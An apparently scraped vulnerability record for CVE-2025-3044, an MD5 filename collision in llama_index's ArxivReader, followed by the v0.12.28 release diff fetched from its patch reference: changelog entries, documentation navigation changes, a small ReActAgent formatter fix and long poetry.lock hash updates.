-    {file = "llama_index_core-0.12.27-py3-none-any.whl", hash = "sha256:01f3f6f539092579cfaccff86c47b7e78c34638273d51417f40d173bf007a84d"},
-    {file = "llama_index_core-0.12.27.tar.gz", hash = "sha256:5019f6e5e5dc2f05da5b802fb02bece213ae4f66ef328b7dd537ddbbbed71374"},
+    {file = "llama_index_core-0.12.28-py3-none-any.whl", hash = "sha256:9bd24224bd57dd5e97bb0a2550f31f6c08b7dc396305f35bbe9714d17b1409a6"},
+    {file = "llama_index_core-0.12.28.tar.gz", hash = "sha256:bf4a9697525e1294855d2df5c3a56b9720c185cde0eae2da713e7629c456c643"},
 ]
 
 [package.dependencies]
@@ -1786,13 +1788,13 @@ openai = ">=1.1.0"
 
 [[package]]
 name = "llama-index-indices-managed-llama-cloud"
-version = "0.6.9"
+version = "0.6.10"
 description = "llama-index indices llama-cloud integration"
 optional = false
 python-versions = "<4.0,>=3.9"
 files = [
-    {file = "llama_index_indices_managed_llama_cloud-0.6.9-py3-none-any.whl", hash = "sha256:8f4002d6d508b8afe7edd003d41e7236868b2774ec0ca266e84d002616e5b96c"},
-    {file = "llama_index_indices_managed_llama_cloud-0.6.9.tar.gz", hash = "sha256:c6450ef8aa99643cf8e78e1371b861a4f209a3bb80b3ec67fd937741f9da8e74"},
+    {file = "llama_index_indices_managed_llama_cloud-0.6.10-py3-none-any.whl", hash = "sha256:de934c7be1957415ca7ec5aab3be973128f790f7c457fb4a402eafecd30370f5"},
+    {file = "llama_index_indices_managed_llama_cloud-0.6.10.tar.gz", hash = "sha256:948ecf45c4d8b96cb4fe946aebfa6593cd9e5edbe16e5f1072249c7b3c56d3b5"},
 ]
 
 [package.dependencies]
@@ -2221,20 +2223,20 @@ pygments = ">2.12.0"
 
 [[package]]
 name = "mkdocs-material"
-version = "9.6.9"
+version = "9.6.11"
 description = "Documentation that simply works"
 optional = false
 python-versions = ">=3.8"
 files = [
-    {file = "mkdocs_material-9.6.9-py3-none-any.whl", hash = "sha256:6e61b7fb623ce2aa4622056592b155a9eea56ff3487d0835075360be45a4c8d1"},
-    {file = "mkdocs_material-9.6.9.tar.gz", hash = "sha256:a4872139715a1f27b2aa3f3dc31a9794b7bbf36333c0ba4607cf04786c94f89c"},
+    {file = "mkdocs_material-9.6.11-py3-none-any.whl", hash = "sha256:47f21ef9cbf4f0ebdce78a2ceecaa5d413581a55141e4464902224ebbc0b1263"},
+    {file = "mkdocs_material-9.6.11.tar.gz", hash = "sha256:0b7f4a0145c5074cdd692e4362d232fb25ef5b23328d0ec1ab287af77cc0deff"},
 ]
 
 [package.dependencies]
 babel = ">=2.10,<3.0"
 backrefs = ">=5.7.post1,<6.0"
 colorama = ">=0.4,<1.0"
-jinja2 = ">=3.0,<4.0"
+jinja2 = ">=3.1,<4.0"
 markdown = ">=3.2,<4.0"
 mkdocs = ">=1.6,<2.0"
 mkdocs-material-extensions = ">=1.3,<2.0"
@@ -2320,103 +2322,103 @@ mkdocstrings = ">=0.25"
 
 [[package]]
 name = "multidict"
-version = "6.2.0"
+version = "6.3.1"
 description = "multidict implementation"
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "multidict-6.2.0-cp310-cp310-macosx_10_9_universal2.whl", hash = "sha256:b9f6392d98c0bd70676ae41474e2eecf4c7150cb419237a41f8f96043fcb81d1"},
-    {file = "multidict-6.2.0-cp310-cp310-macosx_10_9_x86_64.whl", hash = "sha256:3501621d5e86f1a88521ea65d5cad0a0834c77b26f193747615b7c911e5422d2"},
-    {file = "multidict-6.2.0-cp310-cp310-macosx_11_0_arm64.whl", hash = "sha256:32ed748ff9ac682eae7859790d3044b50e3076c7d80e17a44239683769ff485e"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:cc826b9a8176e686b67aa60fd6c6a7047b0461cae5591ea1dc73d28f72332a8a"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:214207dcc7a6221d9942f23797fe89144128a71c03632bf713d918db99bd36de"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:05fefbc3cddc4e36da209a5e49f1094bbece9a581faa7f3589201fd95df40e5d"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:e851e6363d0dbe515d8de81fd544a2c956fdec6f8a049739562286727d4a00c3"},
-    {file = "multidict-6.2.0-cp310-cp310-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:32c9b4878f48be3e75808ea7e499d6223b1eea6d54c487a66bc10a1871e3dc6a"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_aarch64.whl", hash = "sha256:7243c5a6523c5cfeca76e063efa5f6a656d1d74c8b1fc64b2cd1e84e507f7e2a"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_i686.whl", hash = "sha256:0e5a644e50ef9fb87878d4d57907f03a12410d2aa3b93b3acdf90a741df52c49"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_ppc64le.whl", hash = "sha256:0dc25a3293c50744796e87048de5e68996104d86d940bb24bc3ec31df281b191"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_s390x.whl", hash = "sha256:a49994481b99cd7dedde07f2e7e93b1d86c01c0fca1c32aded18f10695ae17eb"},
-    {file = "multidict-6.2.0-cp310-cp310-musllinux_1_2_x86_64.whl", hash = "sha256:641cf2e3447c9ecff2f7aa6e9eee9eaa286ea65d57b014543a4911ff2799d08a"},
-    {file = "multidict-6.2.0-cp310-cp310-win32.whl", hash = "sha256:0c383d28857f66f5aebe3e91d6cf498da73af75fbd51ced
... [truncated]

================================================================================


CVE ID: CVE-2025-3044
Published: 2025-07-07T10:15:26.717
Modified: 2025-07-30T21:28:24.923
CVSS Score: 5.3 (MEDIUM) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-440: CWE-440

Description:
A vulnerability in the ArxivReader class of the run-llama/llama_index repository, versions up to v0.12.22.post1, allows for MD5 hash collisions when generating filenames for downloaded papers. This can lead to data loss as papers with identical titles but different contents may overwrite each other, preventing some papers from being processed for AI model training. The issue is resolved in version 0.12.28.

References (3):
  1. https://github.com/run-llama/llama_index/commit/0008041e8dde8e519621388e5d6f558bde6ef42e [Patch]
  2. https://huntr.com/bounties/80182c3a-876f-422f-8bac-38267e0345d6 [Exploit, Third Party Advisory]
  3. https://huntr.com/bounties/80182c3a-876f-422f-8bac-38267e0345d6 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/run-llama/llama_index/commit/0008041e8dde8e519621388e5d6f558bde6ef42e ---
From 0008041e8dde8e519621388e5d6f558bde6ef42e Mon Sep 17 00:00:00 2001
From: Logan <logan.markewich@live.com>
Date: Tue, 1 Apr 2025 19:46:45 -0600
Subject: [PATCH] v0.12.28 (#18340)

---
 CHANGELOG.md                                  |  88 +++
 docs/docs/CHANGELOG.md                        |  88 +++
 docs/docs/api_reference/agent/index.md        |   5 +-
 docs/docs/api_reference/llms/asi.md           |   4 +
 docs/docs/api_reference/readers/myscale.md    |   4 -
 docs/mkdocs.yml                               |   9 +-
 llama-index-core/llama_index/core/__init__.py |   2 +-
 .../core/agent/workflow/react_agent.py        |   7 +-
 llama-index-core/pyproject.toml               |   2 +-
 poetry.lock                                   | 572 +++++++++---------
 pyproject.toml                                |   4 +-
 11 files changed, 483 insertions(+), 302 deletions(-)
 create mode 100644 docs/docs/api_reference/llms/asi.md
 delete mode 100644 docs/docs/api_reference/readers/myscale.md

diff --git a/CHANGELOG.md b/CHANGELOG.md
index e748136a9e..99f8848db2 100644
--- a/CHANGELOG.md
+++ b/CHANGELOG.md
@@ -1,5 +1,93 @@
 # ChangeLog
 
+## [2025-04-01]
+
+### `llama-index-core` [0.12.28]
+
+- add a code act agent + docs + from-scratch guide (#18329)
+- fix template var mapping for `RichPromptTemplate`, add docs (#18309)
+- Support multi-modal agents in `AgentWorkflow` / `ReActAgent` / `FunctionAgent` / `CodeActAgent` (#18330)
+- fix include Node metadata in hash calculation in new node class (#18303)
+- Fix `Context._events_queue` when loaded from `Context.from_dict` (#18304)
+- docs: add Langfuse instrumentation (#18321)
+
+### `llama-index-embeddings-fastembed` [0.3.1]
+
+- add providers kwarg (#18310)
+
+### `llama-index-graph-stores-memgraph` [0.3.1]
+
+- Update Memgraph integration to latest syntax (#18319)
+
+### `llama-index-indices-managed-llama-cloud` [0.6.10]
+
+- misc fixes in constructing client (#18323)
+
+### `llama-index-llms-asi` [0.1.0]
+
+- add asi llm integration (#18292)
+
+### `llama-index-llms-dashscope` [0.3.2]
+
+- Update DashScope integration with new tool handling and dependency version bump (#18311)
+
+### `llama-index-llms-ipex-llm` [0.3.1]
+
+- fix IpexLLM constructor error (#18200)
+
+### `llama-index-llms-litellm` [0.4.1]
+
+- LiteLLM: better support tools streaming, and support multimodal inputs (#18314)
+
+### `llama-index-readers-obsidian` [0.5.1]
+
+- fix: prevent path traversal from symlinks (#18320)
+
+### `llama-index-readers-papers` [0.3.1]
+
+- fix: make filename hashing more robust (#18318)
+
+### `llama-index-tools-mcp` [0.1.1]
+
+- Fixed case when `json_type` is a list (multiple possible types) (#18306)
+
+### `llama-index-vector-stores-clickhouse` [0.4.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-couchbase` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-deeplake` [0.3.3]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-jaguar` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-lantern` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-nile` [0.2.2]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-milvus` [0.7.2]
+
+- [bugfix] Milvus create index when existed (#18315)
+- Add more unit tests for milvus vector store (#18331)
+
+### `llama-index-vector-stores-oracledb` [0.2.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-singlestoredb` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
 ## [2025-03-28]
 
 ### `llama-index-core` [0.12.27]
diff --git a/docs/docs/CHANGELOG.md b/docs/docs/CHANGELOG.md
index e748136a9e..99f8848db2 100644
--- a/docs/docs/CHANGELOG.md
+++ b/docs/docs/CHANGELOG.md
@@ -1,5 +1,93 @@
 # ChangeLog
 
+## [2025-04-01]
+
+### `llama-index-core` [0.12.28]
+
+- add a code act agent + docs + from-scratch guide (#18329)
+- fix template var mapping for `RichPromptTemplate`, add docs (#18309)
+- Support multi-modal agents in `AgentWorkflow` / `ReActAgent` / `FunctionAgent` / `CodeActAgent` (#18330)
+- fix include Node metadata in hash calculation in new node class (#18303)
+- Fix `Context._events_queue` when loaded from `Context.from_dict` (#18304)
+- docs: add Langfuse instrumentation (#18321)
+
+### `llama-index-embeddings-fastembed` [0.3.1]
+
+- add providers kwarg (#18310)
+
+### `llama-index-graph-stores-memgraph` [0.3.1]
+
+- Update Memgraph integration to latest syntax (#18319)
+
+### `llama-index-indices-managed-llama-cloud` [0.6.10]
+
+- misc fixes in constructing client (#18323)
+
+### `llama-index-llms-asi` [0.1.0]
+
+- add asi llm integration (#18292)
+
+### `llama-index-llms-dashscope` [0.3.2]
+
+- Update DashScope integration with new tool handling and dependency version bump (#18311)
+
+### `llama-index-llms-ipex-llm` [0.3.1]
+
+- fix IpexLLM constructor error (#18200)
+
+### `llama-index-llms-litellm` [0.4.1]
+
+- LiteLLM: better support tools streaming, and support multimodal inputs (#18314)
+
+### `llama-index-readers-obsidian` [0.5.1]
+
+- fix: prevent path traversal from symlinks (#18320)
+
+### `llama-index-readers-papers` [0.3.1]
+
+- fix: make filename hashing more robust (#18318)
+
+### `llama-index-tools-mcp` [0.1.1]
+
+- Fixed case when `json_type` is a list (multiple possible types) (#18306)
+
+### `llama-index-vector-stores-clickhouse` [0.4.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-couchbase` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-deeplake` [0.3.3]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-jaguar` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-lantern` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-nile` [0.2.2]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-milvus` [0.7.2]
+
+- [bugfix] Milvus create index when existed (#18315)
+- Add more unit tests for milvus vector store (#18331)
+
+### `llama-index-vector-stores-oracledb` [0.2.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-singlestoredb` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
 ## [2025-03-28]
 
 ### `llama-index-core` [0.12.27]
diff --git a/docs/docs/api_reference/agent/index.md b/docs/docs/api_reference/agent/index.md
index 822313eeab..4f522b7ae0 100644
--- a/docs/docs/api_reference/agent/index.md
+++ b/docs/docs/api_reference/agent/index.md
@@ -1,6 +1,4 @@
-# Core Agent Classes
-
-## Base Types
+# Agent Classes
 
 ::: llama_index.core.agent.workflow
     options:
@@ -9,6 +7,7 @@
         - BaseWorkflowAgent
         - FunctionAgent
         - ReActAgent
+        - CodeActAgent
         - AgentInput
         - AgentStream
         - AgentOutput
diff --git a/docs/docs/api_reference/llms/asi.md b/docs/docs/api_reference/llms/asi.md
new file mode 100644
index 0000000000..ed914652e2
--- /dev/null
+++ b/docs/docs/api_reference/llms/asi.md
@@ -0,0 +1,4 @@
+::: llama_index.llms.asi
+    options:
+      members:
+        - ASI
diff --git a/docs/docs/api_reference/readers/myscale.md b/docs/docs/api_reference/readers/myscale.md
deleted file mode 100644
index 8624f784c1..0000000000
--- a/docs/docs/api_reference/readers/myscale.md
+++ /dev/null
@@ -1,4 +0,0 @@
-::: llama_index.readers.myscale
-    options:
-      members:
-        - MyScaleReader
diff --git a/docs/mkdocs.yml b/docs/mkdocs.yml
index 3fee5be5dd..c8e9205d41 100644
--- a/docs/mkdocs.yml
+++ b/docs/mkdocs.yml
@@ -97,6 +97,8 @@ nav:
           - ./examples/agent/agent_workflow_research_assistant.ipynb
           - ./examples/agent/anthropic_agent.ipynb
           - ./examples/agent/bedrock_converse_agent.ipynb
+          - ./examples/agent/code_act_agent.ipynb
+          - ./examples/agent/from_scratch_code_act_agent.ipynb
           - ./examples/agent/memory/chat_memory_buffer.ipynb
           - ./examples/agent/memory/composable_memory.ipynb
           - ./examples/agent/memory/summary_memory_buffer.ipynb
@@ -181,7 +183,6 @@ nav:
           - ./examples/data_connectors/MboxReaderDemo.ipynb
           - ./examples/data_connectors/MilvusReaderDemo.ipynb
           - ./examples/data_connectors/MongoDemo.ipynb
-          - ./examples/data_connectors/MyScaleReaderDemo.ipynb
           - ./examples/data_connectors/NotionDemo.ipynb
           - ./examples/data_connectors/ObsidianReaderDemo.ipynb
           - ./examples/data_connectors/PathwayReaderDemo.ipynb
@@ -522,6 +523,7 @@ nav:
           - ./examples/prompts/advanced_prompts.ipynb
           - ./examples/prompts/emotion_prompt.ipynb
           - ./examples/prompts/prompt_mixin.ipynb
+          - ./examples/prompts/rich_prompt_template_features.ipynb
       - Property Graph:
           - ./examples/property_graph/graph_store.ipynb
           - ./examples/property_graph/property_graph_advanced.ipynb
@@ -987,6 +989,7 @@ nav:
           - ./api_reference/llms/alibabacloud_aisearch.md
           - ./api_reference/llms/anthropic.md
           - ./api_reference/llms/anyscale.md
+          - ./api_reference/llms/asi.md
           - ./api_reference/llms/azure_inference.md
           - ./api_reference/llms/azure_openai.md
           - ./api_reference/llms/bedrock.md
@@ -2399,8 +2402,10 @@ plugins:
             - ../llama-index-integrations/llms/llama-index-llms-novita
             - ../llama-index-integrations/llms/llama-index-llms-netmind
             - ../llama-index-integrations/tools/llama-index-tools-dappier
+            - ../llama-index-integrations/llms/llama-index-llms-asi
   - redirects:
       redirect_maps:
+        ./api/llama_index.vector_stores.MongoDBAtlasVectorSearch.html: api_reference/storage/vector_store/mongodb.md
         ./api_reference/agent/coa/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/dashscope/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/function/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
@@ -2411,7 +2416,6 @@ plugins:
         ./api_reference/agent/openai_legacy/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/react/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/workflow/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
-        ./api/llama_index.vector_stores.MongoDBAtlasVectorSearch.html: api_reference/storage/vector_store/mongodb.md
         ./changes/deprecated_terms.html: https://docs.llamaindex.ai/en/stable/changes/deprecated_terms/
         ./community/faq/chat_engines.html: https://docs.llamaindex.ai/en/stable/community/faq/chat_engines/
         ./community/faq/documents_and_nodes.html: https://docs.llamaindex.ai/en/stable/community/faq/documents_and_nodes/
@@ -2560,7 +2564,6 @@ plugins:
         ./examples/data_connectors/MboxReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MboxReaderDemo/
         ./examples/data_connectors/MilvusReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MilvusReaderDemo/
         ./examples/data_connectors/MongoDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MongoDemo/
-        ./examples/data_connectors/MyScaleReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MyScaleReaderDemo/
         ./examples/data_connectors/NotionDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/NotionDemo/
         ./examples/data_connectors/ObsidianReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/ObsidianReaderDemo/
         ./examples/data_connectors/PathwayReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/PathwayReaderDemo/
diff --git a/llama-index-core/llama_index/core/__init__.py b/llama-index-core/llama_index/core/__init__.py
index fb25f0d858..caccfd8e87 100644
--- a/llama-index-core/llama_index/core/__init__.py
+++ b/llama-index-core/llama_index/core/__init__.py
@@ -1,6 +1,6 @@
 """Init file of LlamaIndex."""
 
-__version__ = "0.12.27"
+__version__ = "0.12.28"
 
 import logging
 from logging import NullHandler
diff --git a/llama-index-core/llama_index/core/agent/workflow/react_agent.py b/llama-index-core/llama_index/core/agent/workflow/react_agent.py
index 4e3ab9713c..4e35351f16 100644
--- a/llama-index-core/llama_index/core/agent/workflow/react_agent.py
+++ b/llama-index-core/llama_index/core/agent/workflow/react_agent.py
@@ -1,5 +1,5 @@
 import uuid
-from typing import List, Sequence, cast
+from typing import List, Sequence, Optional, cast
 
 from llama_index.core.agent.react.formatter import ReActChatFormatter
 from llama_index.core.agent.react.output_parser import ReActOutputParser
@@ -28,9 +28,10 @@
 from llama_index.core.workflow import Context
 
 
-def default_formatter(fields: dict) -> ReActChatFormatter:
+def default_formatter(fields: Optional[dict] = None) -> ReActChatFormatter:
     """Sets up a default formatter so that the proper react header is set."""
-    return ReActChatFormatter.from_defaults(context=fields["system_prompt"])
+    fields = fields or {}
+    return ReActChatFormatter.from_defaults(context=fields.get("system_prompt", None))
 
 
 class ReActAgent(SingleAgentRunnerMixin, BaseWorkflowAgent):
diff --git a/llama-index-core/pyproject.toml b/llama-index-core/pyproject.toml
index a437a3291a..e276c438b6 100644
--- a/llama-index-core/pyproject.toml
+++ b/llama-index-core/pyproject.toml
@@ -46,7 +46,7 @@ name = "llama-index-core"
 packages = [{include = "llama_index"}]
 readme = "README.md"
 repository = "https://github.com/run-llama/llama_index"
-version = "0.12.27"
+version = "0.12.28"
 
 [tool.poetry.dependencies]
 SQLAlchemy = {extras = ["asyncio"], version = ">=1.4.49"}
diff --git a/poetry.lock b/poetry.lock
index d0c7bf5008..c5ce268eaa 100644
--- a/poetry.lock
+++ b/poetry.lock
@@ -13,92 +13,92 @@ files = [
 
 [[package]]
 name = "aiohttp"
-version = "3.11.14"
+version = "3.11.15"
 description = "Async http client/server framework (asyncio)"
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "aiohttp-3.11.14-cp310-cp310-macosx_10_9_universal2.whl", hash = "sha256:e2bc827c01f75803de77b134afdbf74fa74b62970eafdf190f3244931d7a5c0d"},
-    {file = "aiohttp-3.11.14-cp310-cp310-macosx_10_9_x86_64.whl", hash = "sha256:e365034c5cf6cf74f57420b57682ea79e19eb29033399dd3f40de4d0171998fa"},
-    {file = "aiohttp-3.11.14-cp310-cp310-macosx_11_0_arm64.whl", hash = "sha256:c32593ead1a8c6aabd58f9d7ee706e48beac796bb0cb71d6b60f2c1056f0a65f"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:b4e7c7ec4146a94a307ca4f112802a8e26d969018fabed526efc340d21d3e7d0"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:c8b2df9feac55043759aa89f722a967d977d80f8b5865a4153fc41c93b957efc"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:c7571f99525c76a6280f5fe8e194eeb8cb4da55586c3c61c59c33a33f10cfce7"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:b59d096b5537ec7c85954cb97d821aae35cfccce3357a2cafe85660cc6295628"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:b42dbd097abb44b3f1156b4bf978ec5853840802d6eee2784857be11ee82c6a0"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_aarch64.whl", hash = "sha256:b05774864c87210c531b48dfeb2f7659407c2dda8643104fb4ae5e2c311d12d9"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_armv7l.whl", hash = "sha256:4e2e8ef37d4bc110917d038807ee3af82700a93ab2ba5687afae5271b8bc50ff"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_i686.whl", hash = "sha256:e9faafa74dbb906b2b6f3eb9942352e9e9db8d583ffed4be618a89bd71a4e914"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_ppc64le.whl", hash = "sha256:7e7abe865504f41b10777ac162c727af14e9f4db9262e3ed8254179053f63e6d"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_s390x.whl", hash = "sha256:4848ae31ad44330b30f16c71e4f586cd5402a846b11264c412de99fa768f00f3"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_x86_64.whl", hash = "sha256:2d0b46abee5b5737cb479cc9139b29f010a37b1875ee56d142aefc10686a390b"},
-    {file = "aiohttp-3.11.14-cp310-cp310-win32.whl", hash = "sha256:a0d2c04a623ab83963576548ce098baf711a18e2c32c542b62322a0b4584b990"},
-    {file = "aiohttp-3.11.14-cp310-cp310-win_amd64.whl", hash = "sha256:5409a59d5057f2386bb8b8f8bbcfb6e15505cedd8b2445db510563b5d7ea1186"},
-    {file = "aiohttp-3.11.14-cp311-cp311-macosx_10_9_universal2.whl", hash = "sha256:f296d637a50bb15fb6a229fbb0eb053080e703b53dbfe55b1e4bb1c5ed25d325"},
-    {file = "aiohttp-3.11.14-cp311-cp311-macosx_10_9_x86_64.whl", hash = "sha256:ec6cd1954ca2bbf0970f531a628da1b1338f594bf5da7e361e19ba163ecc4f3b"},
-    {file = "aiohttp-3.11.14-cp311-cp311-macosx_11_0_arm64.whl", hash = "sha256:572def4aad0a4775af66d5a2b5923c7de0820ecaeeb7987dcbccda2a735a993f"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:1c68e41c4d576cd6aa6c6d2eddfb32b2acfb07ebfbb4f9da991da26633a3db1a"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:99b8bbfc8111826aa8363442c0fc1f5751456b008737ff053570f06a151650b3"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:4b0a200e85da5c966277a402736a96457b882360aa15416bf104ca81e6f5807b"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:d173c0ac508a2175f7c9a115a50db5fd3e35190d96fdd1a17f9cb10a6ab09aa1"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:413fe39fd929329f697f41ad67936f379cba06fcd4c462b62e5b0f8061ee4a77"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_aarch64.whl", hash = "sha256:65c75b14ee74e8eeff2886321e76188cbe938d18c85cff349d948430179ad02c"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_armv7l.whl", hash = "sha256:321238a42ed463848f06e291c4bbfb3d15ba5a79221a82c502da3e23d7525d06"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_i686.whl", hash = "sha256:59a05cdc636431f7ce843c7c2f04772437dd816a5289f16440b19441be6511f1"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_ppc64le.whl", hash = "sha256:daf20d9c3b12ae0fdf15ed92235e190f8284945563c4b8ad95b2d7a31f331cd3"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_s390x.whl", hash = "sha256:05582cb2d156ac7506e68b5eac83179faedad74522ed88f88e5861b78740dc0e"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_x86_64.whl", hash = "sha256:12c5869e7ddf6b4b1f2109702b3cd7515667b437da90a5a4a50ba1354fe41881"},
-    {file = "aiohttp-3.11.14-cp311-cp311-win32.whl", hash = "sha256:92868f6512714efd4a6d6cb2bfc4903b997b36b97baea85f744229f18d12755e"},
-    {file = "aiohttp-3.11.14-cp311-cp311-win_amd64.whl", hash = "sha256:bccd2cb7aa5a3bfada72681bdb91637094d81639e116eac368f8b3874620a654"},
-    {file = "aiohttp-3.11.14-cp312-cp312-macosx_10_13_universal2.whl", hash = "sha256:70ab0f61c1a73d3e0342cedd9a7321425c27a7067bebeeacd509f96695b875fc"},
-    {file = "aiohttp-3.11.14-cp312-cp312-macosx_10_13_x86_64.whl", hash = "sha256:602d4db80daf4497de93cb1ce00b8fc79969c0a7cf5b67bec96fa939268d806a"},
-    {file = "aiohttp-3.11.14-cp312-cp312-macosx_11_0_arm64.whl", hash = "sha256:3a8a0d127c10b8d89e69bbd3430da0f73946d839e65fec00ae48ca7916a31948"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:ca9f835cdfedcb3f5947304e85b8ca3ace31eef6346d8027a97f4de5fb687534"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:8aa5c68e1e68fff7cd3142288101deb4316b51f03d50c92de6ea5ce646e6c71f"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:3b512f1de1c688f88dbe1b8bb1283f7fbeb7a2b2b26e743bb2193cbadfa6f307"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:cc9253069158d57e27d47a8453d8a2c5a370dc461374111b5184cf2f147a3cc3"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:0b2501f1b981e70932b4a552fc9b3c942991c7ae429ea117e8fba57718cdeed0"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_aarch64.whl", hash = "sha256:28a3d083819741592685762d51d789e6155411277050d08066537c5edc4066e6"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_armv7l.whl", hash = "sha256:0df3788187559c262922846087e36228b75987f3ae31dd0a1e5ee1034090d42f"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_i686.whl", hash = "sha256:9e73fa341d8b308bb799cf0ab6f55fc0461d27a9fa3e4582755a3d81a6af8c09"},
-    {file = "aiohttp-3.11.14-cp312-cp312-musllinux_1_2_ppc64le.whl", hash = "sha256:51ba80d473eb780a329d73ac8afa44aa71dfb521693ccea1dea8b9b5c4df45ce"},
